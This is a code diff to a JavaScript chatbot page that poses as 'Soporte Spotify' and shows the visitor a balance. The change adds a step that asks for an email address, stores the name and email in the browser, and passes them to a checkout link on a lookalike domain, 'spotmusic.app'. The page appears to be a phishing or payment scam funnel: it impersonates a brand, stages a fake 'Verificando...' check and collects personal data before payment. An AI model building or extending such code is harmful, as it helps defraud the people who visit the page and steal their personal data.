@@ -734,7 +734,7 @@
       var agentName = 'Soporte Spotify';
       var agentAvatar = document.getElementById('agentAvatar');
       var agentNameEl = document.getElementById('agentName');
-      var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
+      var vars = { nome: '', email: '', balance: parseFloat(balanceVal).toFixed(2) };
 
       var CHECKOUT = 'https://checkout.spotmusic.app/';
 
@@ -908,13 +908,15 @@
         });
       }
 
-      function askText(placeholder) {
+      function askText(placeholder, type, autocomplete) {
         return new Promise(function (resolve) {
           clearInput();
           var wrap = document.createElement('form');
           wrap.className = 'field';
           var i = document.createElement('input');
-          i.type = 'text'; i.placeholder = placeholder; i.autocomplete = 'name';
+          i.type = type || 'text';
+          i.placeholder = placeholder;
+          i.autocomplete = autocomplete || (type === 'email' ? 'email' : 'name');
           var s = document.createElement('button');
           s.type = 'submit'; s.innerHTML = '&#10148;';
           wrap.appendChild(i); wrap.appendChild(s);
@@ -922,6 +924,10 @@
             e.preventDefault();
             var v = i.value.trim();
             if (!v) return;
+            if (type === 'email' && (v.indexOf('@') === -1 || v.indexOf('.') === -1)) {
+              i.style.borderColor = '#ff4444';
+              return;
+            }
             clearInput();
             userRow(v);
             resolve(v);
@@ -1010,7 +1016,17 @@
         await sleep(3000);
         await say('¿Cuál es tu nombre completo?');
         await say('(Escríbelo abajo)');
-        vars.nome = await askText('Escribe tu nombre aquí...');
+        vars.nome = await askText('Escribe tu nombre aquí...', 'text', 'name');
+        try { localStorage.setItem('sp_nome', vars.nome); } catch(e){}
+
+        // Coleta de e-mail
+        step('coleta_de_email1');
+        await sleep(2000);
+        await say('¿Cuál es tu correo electrónico?');
+        await say('(Para registrar tu cuenta y recibir tu comprobante de pago)');
+        vars.email = await askText('ejemplo@correo.com', 'email', 'email');
+        try { localStorage.setItem('sp_email', vars.email); } catch(e){}
+
         var checkingRow = await sayStatus('Verificando...', 'pending');
         await sleep(6000);
 
@@ -1070,6 +1086,7 @@
         var checkoutUrl = window.spUrlWith(CHECKOUT, {
           name: vars.nome || '',
           nome: vars.nome || '',
+          email: vars.email || (function(){ try { return localStorage.getItem('sp_email') || ''; } catch(e){ return ''; } })(),
           spot: '1',
           preview: 'black',
           ref: 'chat',
